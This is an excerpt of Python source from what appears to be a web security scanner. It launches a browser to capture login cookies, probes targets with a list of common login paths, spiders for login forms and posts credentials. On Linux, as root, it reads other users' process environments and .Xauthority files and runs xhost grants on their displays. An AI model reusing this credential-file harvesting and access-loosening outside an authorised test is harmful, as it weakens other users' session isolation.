                    "darwin": [
                        "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
                    ],
                    "linux":  [
                        "/usr/bin/google-chrome", "/usr/bin/google-chrome-stable",
                        "/usr/local/bin/google-chrome",
                        "/opt/google/chrome/google-chrome",
                    ],
                    "win":    [
                        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                        _os.path.expandvars(
                            r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"),
                    ],
                },
                "driver_names": ["chromedriver"],
            },
            {
                "name":        "Brave",
                "engine":      "chrome",
                "path_names":  ["brave-browser", "brave", "brave-browser-stable"],
                "abs_paths": {
                    "darwin": [
                        "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser",
                    ],
                    "linux":  [
                        "/usr/bin/brave-browser", "/usr/bin/brave",
                        "/usr/local/bin/brave-browser",
                        "/opt/brave.com/brave/brave-browser",
                    ],
                    "win":    [
                        r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
                        _os.path.expandvars(
                            r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\Application\brave.exe"),
                    ],
                },
                "driver_names": ["chromedriver"],
            },
            {
                "name":        "Chromium",
                "engine":      "chrome",
                "path_names":  ["chromium-browser", "chromium", "chromium-freeworld"],
                "abs_paths": {
                    "darwin": [
                        "/Applications/Chromium.app/Contents/MacOS/Chromium",
                    ],
                    "linux":  [
                        "/usr/bin/chromium-browser", "/usr/bin/chromium",
                        "/usr/local/bin/chromium",
                        "/snap/bin/chromium",
                    ],
                    "win":    [
                        r"C:\Program Files\Chromium\Application\chrome.exe",
                    ],
                },
                "driver_names": ["chromedriver", "chromium-chromedriver",
                                  "chromium.chromedriver"],
            },
            {
                "name":        "Edge",
                "engine":      "edge",
                "path_names":  ["microsoft-edge", "microsoft-edge-stable",
                                 "msedge", "edge"],
                "abs_paths": {
                    "darwin": [
                        "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge",
                    ],
                    "linux":  [
                        "/usr/bin/microsoft-edge", "/usr/bin/microsoft-edge-stable",
                        "/usr/bin/msedge",
                        "/opt/microsoft/msedge/msedge",
                    ],
                    "win":    [
                        r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                        r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
                    ],
                },
                "driver_names": ["msedgedriver", "msedgedriver.exe"],
            },
        ]

        def _locate_binary(browser: dict) -> str:
            """Return path to browser executable or empty string."""
            for name in browser.get("path_names", []):
                found = _shutil.which(name)
                if found:
                    return found
            for p in browser.get("abs_paths", {}).get(_plat, []):
                if p and _os.path.isfile(p):
                    return p
            return ""

        def _locate_driver(browser: dict) -> str:
            """Return path to WebDriver binary or empty string."""
            for name in browser.get("driver_names", []):
                found = _shutil.which(name)
                if found:
                    return found
            return ""

        # Fresh isolated profile dir for every browser-auth invocation.
        # Prevents Chrome/Firefox session-restore from reopening the previous
        # target's login page when a second target is scanned in the same run.
        import tempfile as _tf_browser
        _tmp_profile = _tf_browser.mkdtemp(prefix="fracture_browser_")

        def _launch_chrome_engine(bin_path: str, drv_path: str) -> "object":
            from selenium.webdriver.chrome.options import Options as _CO
            from selenium.webdriver.chrome.service import Service as _CS
            opts = _CO()
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument(f"--user-data-dir={_tmp_profile}")
            opts.add_argument("--no-first-run")
            opts.add_argument("--no-default-browser-check")
            opts.add_experimental_option("excludeSwitches", ["enable-automation"])
            opts.add_experimental_option("useAutomationExtension", False)
            if bin_path:
                opts.binary_location = bin_path
            svc = _CS(executable_path=drv_path) if drv_path else None
            return _wd.Chrome(service=svc, options=opts) if svc else _wd.Chrome(options=opts)

        def _launch_edge_engine(bin_path: str, drv_path: str) -> "object":
            from selenium.webdriver.edge.options import Options as _EO
            from selenium.webdriver.edge.service import Service as _ES
            opts = _EO()
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument(f"--user-data-dir={_tmp_profile}")
            opts.add_argument("--no-first-run")
            opts.add_argument("--no-default-browser-check")
            if bin_path:
                opts.binary_location = bin_path
            svc = _ES(executable_path=drv_path) if drv_path else None
            return _wd.Edge(service=svc, options=opts) if svc else _wd.Edge(options=opts)

        def _launch_firefox_engine(bin_path: str, drv_path: str) -> "object":
            from selenium.webdriver.firefox.options import Options as _FO
            from selenium.webdriver.firefox.service import Service as _FS
            from selenium.webdriver.firefox.firefox_profile import FirefoxProfile as _FFP
            import tempfile as _tf2
            # Write prefs directly into _tmp_profile/user.js so they are present
            # in the profile zip regardless of set_preference() timing.
            try:
                _user_js_path = _os.path.join(_tmp_profile, "user.js")
                _user_js_lines = [
                    'user_pref("browser.sessionstore.resume_from_crash", false);',
                    'user_pref("toolkit.startup.max_resumed_crashes", -1);',
                    'user_pref("browser.startup.page", 0);',
                    'user_pref("browser.startup.homepage", "about:blank");',
                    'user_pref("browser.sessionstore.resume_session_once", false);',
                    'user_pref("browser.sessionstore.max_tabs_undo", 0);',
                    'user_pref("browser.sessionstore.max_windows_undo", 0);',
                ]
                with open(_user_js_path, "w", encoding="utf-8") as _ujf:
                    _ujf.write("\n".join(_user_js_lines) + "\n")
            except Exception:
                pass
            # Build an isolated FirefoxProfile object from the temp dir.
            # Passing an object (not a string path) is compatible with both
            # Selenium 3.x and 4.x — on Selenium 3.x the string-path setter is
            # silently ignored, leaving Firefox on the default profile and causing
            # session restore to reopen the previous target's login page.
            _ff_profile = _FFP(_tmp_profile)
            _ff_profile.set_preference("browser.sessionstore.resume_from_crash", False)
            _ff_profile.set_preference("toolkit.startup.max_resumed_crashes", -1)
            _ff_profile.set_preference("browser.startup.page", 0)
            _ff_profile.set_preference("browser.startup.homepage", "about:blank")
            _ff_profile.set_preference("browser.sessionstore.resume_session_once", False)
            _ff_profile.set_preference("browser.sessionstore.max_tabs_undo", 0)
            _ff_profile.set_preference("browser.sessionstore.max_windows_undo", 0)
            opts = _FO()
            opts.add_argument("-no-remote")
            opts.profile = _ff_profile
            # Belt-and-suspenders: also set prefs via moz:firefoxOptions["prefs"]
            # (geckodriver capability path).  This fires even when FirefoxProfile
            # serialisation silently fails and Firefox falls back to the default
            # profile — which was the root cause of session-restore reopening the
            # previous target's login page.
            opts.set_preference("browser.sessionstore.resume_from_crash", False)
            opts.set_preference("toolkit.startup.max_resumed_crashes", -1)
            opts.set_preference("browser.startup.page", 0)
            opts.set_preference("browser.startup.homepage", "about:blank")
            opts.set_preference("browser.sessionstore.resume_session_once", False)
            opts.set_preference("browser.sessionstore.max_tabs_undo", 0)
            opts.set_preference("browser.sessionstore.max_windows_undo", 0)
            if bin_path:
                opts.binary_location = bin_path
            _log_fd, _log_path = _tf2.mkstemp(prefix="fracture_gd_", suffix=".log")
            _os.close(_log_fd)
            if drv_path:
                svc = _FS(executable_path=drv_path, log_output=_log_path)
            else:
                try:
                    from webdriver_manager.firefox import GeckoDriverManager as _GDM
                    svc = _FS(executable_path=_GDM().install(), log_output=_log_path)
                except Exception:
                    svc = None
            try:
                return _wd.Firefox(service=svc, options=opts) if svc else _wd.Firefox(options=opts)
            except Exception as _fe:
                try:
                    _gd_out = open(_log_path).read().strip()
                    if _gd_out:
                        vc.log(f"[auth] geckodriver log:\n{_gd_out[-3000:]}", "WARNING")
                except Exception:
                    pass
                raise _fe
            finally:
                try:
                    _os.unlink(_log_path)
                except Exception:
                    pass

        # ── Display / session discovery ───────────────────────────────────────────
        # One session dict per unique DISPLAY value found in /proc/*/environ.
        # Each dict carries the keys the browser process needs, plus helpers:
        #   _display, _uid, _xauth_file (root-owned Xauthority path)
        _all_sessions = []   # populated on Linux; left as [{}] on other platforms

        if _sys.platform.startswith("linux"):
            import glob as _glob
            import tempfile as _tf3
            import pwd as _pwd2

            # ── Scan /proc for every active desktop session ───────────────────
            # Root can read any process's /proc/<pid>/environ.  This is the only
            # reliable source after `sudo su -` strips all display-related vars.
            # Sessions are deduplicated by DISPLAY value; entries with
            # DBUS_SESSION_BUS_ADDRESS are promoted to the front (full sessions).
            _seen_displays: set = set()
            try:
                for _ef in sorted(_glob.glob("/proc/*/environ")):
                    try:
                        _uid = _os.stat(_ef).st_uid
                        _raw = open(_ef, "rb").read().decode("utf-8", errors="replace")
                        _penv: dict = {}
                        for _e in _raw.split("\x00"):
                            if "=" in _e:
                                _pk, _, _pv = _e.partition("=")
                                _penv[_pk] = _pv
                        _disp = _penv.get("DISPLAY") or _penv.get("WAYLAND_DISPLAY", "")
                        if not _disp or _disp in _seen_displays:
                            continue
                        _seen_displays.add(_disp)
                        _penv["_uid"] = _uid
                        _penv["_display"] = _disp
                        if "DBUS_SESSION_BUS_ADDRESS" in _penv:
                            _all_sessions.insert(0, _penv)   # full session → front
                        else:
                            _all_sessions.append(_penv)
                    except Exception:
                        pass
            except Exception:
                pass

            # If /proc scan missed the current shell's DISPLAY, add it
            _cur_disp = _os.environ.get("DISPLAY") or _os.environ.get("WAYLAND_DISPLAY", "")
            if _cur_disp and _cur_disp not in _seen_displays:
                _all_sessions.insert(0, {
                    "_display": _cur_disp,
                    "DISPLAY": _cur_disp,
                    "_uid": _os.getuid(),
                })
                _seen_displays.add(_cur_disp)

            # Fall back to X11 socket probing if /proc found nothing
            if not _all_sessions:
                _x_sockets = sorted(_glob.glob("/tmp/.X11-unix/X*"))
                _best = next(
                    (s for s in _x_sockets
                     if _os.path.exists(s) and _os.stat(s).st_uid != 0),
                    _x_sockets[0] if _x_sockets else None,
                )
                if _best:
                    _fb_d = ":" + _best.rsplit("X", 1)[-1]
                    _all_sessions.append({
                        "_display": _fb_d, "DISPLAY": _fb_d,
                        "_uid": _os.stat(_best).st_uid,
                    })
                else:
                    _wl = sorted(_glob.glob("/run/user/*/wayland-*"))
                    if _wl:
                        _fb_d = _wl[0].split("/")[-1]
                        _all_sessions.append({
                            "_display": _fb_d, "WAYLAND_DISPLAY": _fb_d,
                            "_uid": 0,
                        })

            if not _all_sessions:
                vc.log(
                    "[auth] No display detected (DISPLAY/WAYLAND_DISPLAY not set). "
                    "Browser-assisted login requires a desktop environment. "
                    "Run Fracture from a graphical terminal, or use a different auth method.",
                    "ERROR",
                )
                return None

            vc.log(
                f"[auth] {len(_all_sessions)} session(s) found: "
                + ", ".join(s["_display"] for s in _all_sessions),
                "INFO",
            )

            # ── Per-session XAUTHORITY prep ───────────────────────────────────
            # For each session, build a root-owned XAUTHORITY and run xhost so
            # the X server accepts UID-0 connections on that display.
            # Results are stored in the session dict as "_xauth_file".
            def _prep_xauth(sess: dict) -> None:
                _d   = sess["_display"]
                _dn  = _d.lstrip(":")
                _uid = sess.get("_uid", 0)
                _sxa = sess.get("XAUTHORITY", "")
                if _sxa and _os.path.isfile(_sxa) and _os.stat(_sxa).st_uid == 0:
                    sess["_xauth_file"] = _sxa
                    return
                _sources = (
                    ([_sxa] if _sxa and _os.path.isfile(_sxa) else [])
                    + [_os.path.expanduser("~/.Xauthority")]
                    + sorted(_glob.glob("/home/*/.Xauthority"))
                    + sorted(_glob.glob("/tmp/.gdm-xauth-*"))
                    + sorted(_glob.glob("/tmp/.xauth*"))
                    + sorted(_glob.glob("/run/user/*/.mutter-Xwaylandauth.*"))
                )
                # xhost grant (best-effort)
                _owner = None
                _xhost_src = _sxa if (_sxa and _os.path.isfile(_sxa)) else next(
                    (s for s in _sources
                     if _os.path.isfile(s) and _os.stat(s).st_uid != 0),
                    None,
                )
                if _uid and _uid != 0:
                    try:
                        _owner = _pwd2.getpwuid(_uid).pw_name
                    except Exception:
                        pass
                if not _owner:
                    _xsock = f"/tmp/.X11-unix/X{_dn}"
                    if _os.path.exists(_xsock):
                        _su = _os.stat(_xsock).st_uid
                        if _su and _su != 0:
                            try:
                                _owner = _pwd2.getpwuid(_su).pw_name
                            except Exception:
                                pass
                if _owner and _xhost_src:
                    for _arg in ["+SI:localuser:root", "+local:"]:
                        try:
                            _r = subprocess.run(
                                ["su", _owner, "-c",
                                 f"DISPLAY={_d} XAUTHORITY={_xhost_src} xhost {_arg}"],
                                capture_output=True, timeout=5,
                            )
                            if _r.returncode == 0:
                                vc.log(f"[auth] xhost {_arg} granted for {_d} ({_owner})", "INFO")
                                break
                        except Exception:
                            pass
                # xauth add — create root-owned XAUTHORITY
                for _xs in _sources:
                    if not _os.path.isfile(_xs):
                        continue
                    if _os.stat(_xs).st_uid == 0:
                        sess["_xauth_file"] = _xs
                        return
                    _xl = subprocess.run(
                        ["xauth", "-f", _xs, "list"], capture_output=True, text=True,
                    )
                    _cl = None
                    for _ln in _xl.stdout.splitlines():
                        if f":{_dn}" in _ln:
                            _p = _ln.strip().split()
                            if len(_p) >= 3:
                                _cl = _p
                                break
                    if not _cl:
                        continue
                    try:
                        _fd, _xp = _tf3.mkstemp(prefix="fracture_xauth_")
                        _os.close(_fd)
                        _os.chmod(_xp, 0o600)
                        subprocess.run(
                            ["xauth", "-f", _xp, "add", f":{_dn}", _cl[1], _cl[2]],
                            capture_output=True,
                        )
                        sess["_xauth_file"] = _xp
                        vc.log(f"[auth] XAUTHORITY for {_d} → {_xp}", "INFO")
                        return
                    except Exception:
                        pass
                vc.log(f"[auth] Could not build XAUTHORITY for {_d} — may fail", "WARNING")

            for _s in _all_sessions:
                _prep_xauth(_s)

            # HOME fix (once, not per-session)
            if _os.getuid() == 0 and not _os.environ.get("HOME", "").startswith("/root"):
                _os.environ["HOME"] = "/root"
                vc.log("[auth] HOME reset to /root", "INFO")

        else:
            # Non-Linux: no session management needed; one empty session acts as
            # a pass-through so the browser loop below iterates exactly once
            _all_sessions = [{}]

        # ── Session selection ─────────────────────────────────────────────────────
        # If multiple sessions were found, offer the user a choice before
        # attempting any browser launch.  This avoids silently using the wrong
        # display when several desktops are active.
        if len(_all_sessions) > 1:
            vc.log("[auth] Multiple active sessions detected:", "INFO")
            _sess_labels = []
            for _si, _ss in enumerate(_all_sessions, 1):
                _sd = _ss.get("_display", "?")
                _slbl = _sd
                if _sys.platform.startswith("linux") and _ss.get("_uid"):
                    try:
                        import pwd as _pwd3
                        _slbl = f"{_sd} ({_pwd3.getpwuid(_ss['_uid']).pw_name})"
                    except Exception:
                        pass
                _sess_labels.append(_slbl)
                vc.log(f"  [{_si}]  {_slbl}", "INFO")
            _choice = vc.prompt(
                f"Select display session [1-{len(_all_sessions)}] or leave empty to try all",
                prompt_type="text",
                options=_sess_labels,
                skippable=True,
            ).strip()
            if _choice.isdigit():
                _ci = int(_choice) - 1
                if 0 <= _ci < len(_all_sessions):
                    _all_sessions = [_all_sessions[_ci]]
                    vc.log(f"[auth] Using session: {_all_sessions[0]['_display']}", "INFO")
            elif _choice:
                for _si2, _lbl2 in enumerate(_sess_labels):
                    if _lbl2.strip().lower() == _choice.strip().lower() or _choice in _lbl2:
                        _all_sessions = [_all_sessions[_si2]]
                        vc.log(f"[auth] Using session: {_all_sessions[0]['_display']}", "INFO")
                        break

        # Helper: apply one session's env vars before a browser launch attempt.
        # XAUTHORITY must be root-owned for Firefox; if no root-owned file was
        # prepared for this session, remove the var so Firefox's ownership check
        # sees nothing rather than a non-root-owned file.
        def _apply_sess(sc: dict) -> None:
            if sc.get("DISPLAY"):
                _os.environ["DISPLAY"] = sc["DISPLAY"]
            if sc.get("WAYLAND_DISPLAY"):
                _os.environ["WAYLAND_DISPLAY"] = sc["WAYLAND_DISPLAY"]
            if sc.get("DBUS_SESSION_BUS_ADDRESS"):
                _os.environ["DBUS_SESSION_BUS_ADDRESS"] = sc["DBUS_SESSION_BUS_ADDRESS"]
            if sc.get("XDG_RUNTIME_DIR"):
                _os.environ["XDG_RUNTIME_DIR"] = sc["XDG_RUNTIME_DIR"]
            if sc.get("_xauth_file"):
                _os.environ["XAUTHORITY"] = sc["_xauth_file"]
            else:
                _xa = _os.environ.get("XAUTHORITY", "")
                if _xa and _os.path.isfile(_xa) and _os.stat(_xa).st_uid != 0:
                    _os.environ.pop("XAUTHORITY", None)

        # ── Driver / browser resolution ───────────────────────────────────────
        _explicit_drv = (
            cfg.get("chromedriver_path")
            or _os.environ.get("FRACTURE_CHROMEDRIVER", "")
        )

        driver      = None
        _used_name  = ""

        # If an explicit driver path was provided, try it across all sessions
        if _explicit_drv:
            vc.log(f"[auth] Using specified WebDriver: {_explicit_drv}", "INFO")
            for _sc in _all_sessions:
                _apply_sess(_sc)
                _sc_lbl = f" [{_sc['_display']}]" if _sc.get("_display") else ""
                try:
                    driver     = _launch_chrome_engine("", _explicit_drv)
                    _used_name = f"Chrome (explicit driver){_sc_lbl}"
                    break
                except Exception as _e:
                    vc.log(
                        f"[auth] Specified driver failed{_sc_lbl} ({_e})"
                        " — trying next session",
                        "WARNING",
                    )

        if driver is None:
            for _b in _BROWSERS:
                _bin  = _locate_binary(_b)
                _drv  = _locate_driver(_b)
                # Chrome engine can rely on Selenium's built-in driver manager even
                # without a found binary/driver; all other engines need at least the binary.
                if not _bin and _b["engine"] != "chrome":
                    continue
                _bin_lbl = _bin or "(default install)"
                _drv_lbl = _drv or "(selenium-manager)"
                for _sc in _all_sessions:
                    _apply_sess(_sc)
                    _sc_lbl = f" [{_sc['_display']}]" if _sc.get("_display") else ""
                    vc.log(
                        f"[auth] Trying {_b['name']}{_sc_lbl}: "
                        f"binary={_bin_lbl}  driver={_drv_lbl}",
                        "INFO",
                    )
                    try:
                        engine = _b["engine"]
                        if engine == "chrome":
                            driver = _launch_chrome_engine(_bin, _drv)
                        elif engine == "edge":
                            driver = _launch_edge_engine(_bin, _drv)
                        else:
                            driver = _launch_firefox_engine(_bin, _drv)
                        _used_name = f"{_b['name']}{_sc_lbl}"
                        break
                    except Exception as _e:
                        vc.log(
                            f"[auth] {_b['name']}{_sc_lbl} unavailable: {_e}",
                            "WARNING",
                        )
                if driver:
                    break

        if driver is None:
            vc.log(
                "[auth] No supported browser could be launched. Install Chrome, Firefox, "
                "or Edge along with the matching WebDriver (chromedriver / geckodriver / "
                "msedgedriver), or specify the driver with --chromedriver <path>.",
                "ERROR",
            )
            return None

        # ── Interactive session capture ───────────────────────────────────────
        try:
            vc.log(f"[auth] {_used_name} opened — navigate to {login_url} and log in", "INFO")
            driver.get(login_url)
            vc.log(
                "[auth] Complete login in the browser window, then click OK (or press Enter) "
                "to capture the session and continue …",
                "INFO",
            )
            vc.prompt(
                "Complete login in the browser, then click OK to capture the session",
                prompt_type="text",
                skippable=True,
            )

            captured_url    = driver.current_url
            browser_cookies = driver.get_cookies()
        finally:
            try:
                driver.quit()
            except Exception:
                pass
            try:
                _shutil.rmtree(_tmp_profile, ignore_errors=True)
            except Exception:
                pass

        if not browser_cookies:
            vc.log("[auth] No cookies captured from browser — cannot build session", "WARNING")
            return None

        # Transfer cookies into a fresh scoped session
        new_sess = _make_session(cfg, _scope_hostnames)
        for ck in browser_cookies:
            domain = ck.get("domain", "").lstrip(".")
            new_sess.cookies.set(ck["name"], ck["value"], domain=domain or None)

        vc.log(
            f"[auth] Captured {len(browser_cookies)} cookie(s) via {_used_name} "
            f"(browser was at {captured_url})",
            "SUCCESS",
        )
        return new_sess

    # ── Login URL discovery ───────────────────────────────────────────────────
    _LOGIN_CANDIDATE_PATHS = [
        # IBM Cognos — checked first because its login path is not generic
        "/ibmcognos", "/ibmcognos/", "/ibmcognos/bi/", "/ibmcognos/bi/v1/disp",
        # Generic
        "/login", "/signin", "/sign-in", "/log-in", "/logon", "/signon",
        "/auth", "/auth/login", "/auth/signin", "/authenticate",
        "/user/login", "/users/login", "/user/sign_in",
        "/account/login", "/account/signin",
        "/admin/login", "/wp-login.php",
        "/portal/login", "/portal", "/sso/login",
        "/api/auth/login", "/api/login", "/api/signin",
        # Static extensions
        "/login.php", "/login.html", "/login.aspx", "/login.jsp",
        "/signin.php", "/signin.html",
        "/login.cfm", "/login.cgi",
        # Java Struts / Spring MVC / generic .action
        "/login.action", "/signin.action", "/logon.action", "/signon.action",
        "/auth.action", "/authenticate.action",
        "/Login.action", "/SignIn.action", "/Logon.action",
        "/user/login.action", "/account/login.action",
        "/admin/login.action",
        # Java Servlet (.do)
        "/login.do", "/signin.do", "/logon.do", "/auth.do",
        "/Login.do", "/SignIn.do", "/Logon.do",
        # Java EE / J2EE container auth
        "/j_security_check",
        # Spring Security
        "/j_spring_security_check",
        # JSF / Facelets
        "/login.jsf", "/signin.jsf", "/login.faces", "/signin.faces",
        "/login.xhtml", "/signin.xhtml",
        # ColdFusion
        "/login.cfm", "/signin.cfm",
        # ASP.NET additional
        "/login.aspx", "/signin.aspx", "/Account/Login",
        "/Identity/Account/Login",
    ]

    def _discover_login_url(base_url: str) -> "str":
        """
        Try common login paths against base_url, then spider up to depth 3
        to locate a form with username + password fields.  Returns the
        discovered URL or empty string if none found.
        """
        from urllib.parse import urljoin as _uj4, urlparse as _up4
        base = base_url.rstrip("/")

        vc.log(f"[auth] No login-url configured — probing common login paths on {base}", "INFO")

        # 1. Common paths
        for path in _LOGIN_CANDIDATE_PATHS:
            probe = base + path
            try:
                r = sess.get(probe, timeout=timeout, allow_redirects=True)
                if r.status_code not in (200, 302, 301):
                    continue
                page = _analyse_form_page(r.text, r.url)
                if page["login_form"] or (page["has_username"] and page["has_checkbox"]):
                    vc.log(f"[auth] Login form found at common path: {r.url}", "SUCCESS")
                    return r.url
                if page.get("js_rendered_login"):
                    vc.log(
                        f"[auth] JS-rendered login page at common path: {r.url} "
                        "(browser-auth required)", "INFO")
                    return r.url
            except Exception:
                continue

        # 2. Spider up to depth 3
        vc.log(f"[auth] Common paths yielded no login form — spidering {base} (depth 3)", "INFO")
        _visited: set = {base, base + "/"}
        _queue:   list = [(base, 0)]
        import re as _re4
        _base_host = _up4(base).netloc

        # Hint keywords for queue prioritisation
        _LOGIN_HINTS = (
            "login", "signin", "sign-in", "log-in", "logon", "signon",
            "auth", "authenticate", "authentication",
            "sso", "portal", "session", "credential",
            # Java-specific
            "j_security", "j_spring", "struts",
        )
        # Server-side page framework extensions that indicate dynamic pages
        _ACTION_EXTS = (".action", ".do", ".jsf", ".faces", ".xhtml",
                        ".cfm", ".cgi", ".asp", ".aspx", ".jsp", ".php",
                        ".html", ".htm")

        def _is_login_hint(url_norm: str) -> bool:
            _lc = url_norm.lower()
            return any(h in _lc for h in _LOGIN_HINTS)

        def _extract_spider_urls(html: str, base_r_url: str) -> "list[str]":
            """
            Collect candidate navigation URLs from a page.
            Covers: <a href>, <form action>, onclick/data-* URL values.
            """
            _cands: list = []
            # Standard href links
            for _h in _re4.findall(r'href=["\']([^"\']+)["\']', html, _re4.IGNORECASE):
                _cands.append(_h)
            # Form action attributes — critical for .action / .do / .jsf pages
            for _a in _re4.findall(
                    r'<form\b[^>]+\baction=["\']([^"\']+)["\']', html, _re4.IGNORECASE):
                _cands.append(_a)
            # onclick / data-href / data-url / data-action containing URL-like values
            for _attr_val in _re4.findall(
                    r'(?:onclick|data-href|data-url|data-action|data-link)\s*='
                    r'\s*["\']([^"\']+)["\']',
                    html, _re4.IGNORECASE):
                # Pull out anything that looks like a relative/absolute page path
                for _m in _re4.finditer(
                        r'["\']?([/\w\-\.%]+\.(?:action|do|jsf|faces|xhtml|cfm'
                        r'|asp|aspx|jsp|php|html?))["\']?',
                        _attr_val, _re4.IGNORECASE):
                    _cands.append(_m.group(1))
            return _cands

        while _queue:
            cur_url, depth = _queue.pop(0)
            if depth > 3:
                continue
            try:
                r = sess.get(cur_url, timeout=timeout, allow_redirects=True)
            except Exception:
                continue
            if r.status_code != 200:
                continue

            page = _analyse_form_page(r.text, r.url)
            if page["login_form"] or (page["has_username"] and page["has_checkbox"]):
                vc.log(f"[auth] Login form found via spider at: {r.url}", "SUCCESS")
                return r.url
            if page.get("js_rendered_login"):
                vc.log(
                    f"[auth] JS-rendered login page found via spider at: {r.url} "
                    "(browser-auth required)", "INFO")
                return r.url

            if depth < 3:
                for raw_url in _extract_spider_urls(r.text, r.url):
                    if raw_url.lower().startswith(
                            ("javascript:", "mailto:", "tel:", "#", "data:")):
                        continue
                    candidate = _uj4(r.url, raw_url)
                    parsed    = _up4(candidate)
                    if parsed.netloc != _base_host:
                        continue
                    norm = candidate.split("?")[0].rstrip("/")
                    if norm in _visited:
                        continue
                    _visited.add(norm)
                    if _is_login_hint(norm):
                        _queue.insert(0, (candidate, depth + 1))
                    else:
                        _queue.append((candidate, depth + 1))

        vc.log(f"[auth] Could not locate a login form via spidering", "WARNING")
        return ""

    # ── Login POST helper ─────────────────────────────────────────────────────
    def _login_post(base_url: str) -> "tuple[requests.Response | None, str]":
        """CSRF prefetch + POST credentials to resolved form action. Returns (resp, post_url)."""
        if not base_url:
            return None, ""
        login_mode = auth.get("login_mode", "fields")
        uf = auth.get("login_username_field", "username")
        pf = auth.get("login_password_field", "password")
        u  = auth.get("username", "")
        p  = auth.get("password", "")
        form_action, hidden = _csrf_prefetch(base_url)
        post_url = form_action if form_action else base_url
        if login_mode == "fields":
            data: dict = dict(hidden)
            if u: data[uf] = u
            if p: data[pf] = p
        elif login_mode == "json":
            raw = auth.get("login_data", "{}")
            try:
                data = json.loads(raw) if isinstance(raw, str) else dict(raw)
            except Exception:
                data = {}
        else:  # "merge"
            raw = auth.get("login_data", "{}")
            try:
                data = json.loads(raw) if isinstance(raw, str) else dict(raw)
            except Exception:
                data = {}
            if u and uf not in data: data[uf] = u
            if p and pf not in data: data[pf] = p
            for k, v in hidden.items():
                if k not in data: data[k] = v
        ct = auth.get("login_content_type", "application/x-www-form-urlencoded")
        try:
            if "json" in ct:
                return sess.post(post_url, json=data, timeout=timeout, allow_redirects=True), post_url
            return sess.post(post_url, data=data, timeout=timeout, allow_redirects=True), post_url
        except Exception:
            return None, post_url

    # ── Post-login interactive form finder ───────────────────────────────────
    def _find_interactive_forms(html: str, page_url: str) -> "list":
        """
        Find forms on a page that contain interactive (non-password) fields.
        Returns a list of form dicts:
          {action, method, hidden, fields}
        where each field is:
          {name, type, label, value, checked, options}
        Skips forms that contain a password input (those are login forms).
        """
        import re as _re6
        from urllib.parse import urljoin as _uj6

        _INTERACTIVE = frozenset({
            "text", "email", "tel", "number", "search",
            "checkbox", "radio", "select", "password", "otp",
        })

        # Build label map: input-id / input-name → label text
        _label_map: dict = {}
        for _lm in _re6.finditer(
                r'<label\b[^>]*\bfor=["\']([^"\']+)["\'][^>]*>(.*?)</label>',
                html, _re6.IGNORECASE | _re6.DOTALL):
            _label_map[_lm.group(1)] = _re6.sub(r'<[^>]+>', '', _lm.group(2)).strip()

        forms: list = []
        for _fm in _re6.finditer(r'(?s)<form\b[^>]*>(.+?)</form>', html, _re6.IGNORECASE):
            _ftag  = _fm.group(0)
            _fbody = _fm.group(1)

            _am = _re6.search(r'\baction=["\']([^"\']*)["\']', _ftag, _re6.IGNORECASE)
            _mm = _re6.search(r'\bmethod=["\']([^"\']*)["\']', _ftag, _re6.IGNORECASE)
            _action = _uj6(page_url, _am.group(1).strip()) if _am else page_url
            _method = _mm.group(1).strip().lower() if _mm else "post"

            _has_pw = bool(_re6.search(
                r'<input[^>]+type=["\']?password["\']?', _fbody, _re6.IGNORECASE))

            _hidden: dict = {}
            _fields: list = []

            # ── <input> tags ─────────────────────────────────────────────────
            for _inp in _re6.finditer(r'<input\b([^>]*)/?>', _fbody, _re6.IGNORECASE):
                _a    = _inp.group(1)
                _t    = (_re6.search(r'\btype=["\']?(\w+)["\']?',     _a, _re6.IGNORECASE) or
                         type('_', (), {'group': lambda s, n: ''})()).group(1).lower() or "text"
                _n_m  = _re6.search(r'\bname=["\']([^"\']+)["\']',    _a, _re6.IGNORECASE)
                _id_m = _re6.search(r'\bid=["\']([^"\']+)["\']',      _a, _re6.IGNORECASE)
                _v_m  = _re6.search(r'\bvalue=["\']([^"\']*)["\']',   _a, _re6.IGNORECASE)
                _ph_m = _re6.search(r'\bplaceholder=["\']([^"\']+)["\']', _a, _re6.IGNORECASE)
                _chk  = bool(_re6.search(r'\bchecked\b',              _a, _re6.IGNORECASE))
                if not _n_m:
                    continue
                _iname = _n_m.group(1)
                _iid   = _id_m.group(1) if _id_m else ""
                _ival  = _v_m.group(1)  if _v_m  else ""
                _iph   = _ph_m.group(1) if _ph_m else ""
                if _t == "hidden":
                    _hidden[_iname] = _ival
                    continue
                if _t in ("submit", "image", "reset", "button"):
                    continue
                _ilabel = _label_map.get(_iid) or _label_map.get(_iname) or _iph or _iname
                _fields.append({
                    "name": _iname, "type": _t, "label": _ilabel,
                    "value": _ival,  "checked": _chk, "options": [],
                })

            # ── <select> tags ─────────────────────────────────────────────────
            for _sm in _re6.finditer(
                    r'<select\b([^>]*)>(.*?)</select>', _fbody,
                    _re6.IGNORECASE | _re6.DOTALL):
                _sa   = _sm.group(1)
                _sb   = _sm.group(2)
                _n_m  = _re6.search(r'\bname=["\']([^"\']+)["\']', _sa, _re6.IGNORECASE)
                _id_m = _re6.search(r'\bid=["\']([^"\']+)["\']',   _sa, _re6.IGNORECASE)
                if not _n_m:
                    continue
                _sname  = _n_m.group(1)
                _sid    = _id_m.group(1) if _id_m else ""
                _slabel = _label_map.get(_sid) or _label_map.get(_sname) or _sname
                _opts: list = []
                for _om in _re6.finditer(
                        r'<option\b([^>]*)>(.*?)</option>', _sb,
                        _re6.IGNORECASE | _re6.DOTALL):
                    _ov_m  = _re6.search(r'\bvalue=["\']([^"\']*)["\']', _om.group(1), _re6.IGNORECASE)
                    _otext = _re6.sub(r'<[^>]+>', '', _om.group(2)).strip()
                    _oval  = _ov_m.group(1) if _ov_m else _otext
                    _opts.append((_oval, _otext))
                _fields.append({
                    "name": _sname, "type": "select", "label": _slabel,
                    "value": _opts[0][0] if _opts else "", "checked": False, "options": _opts,
                })

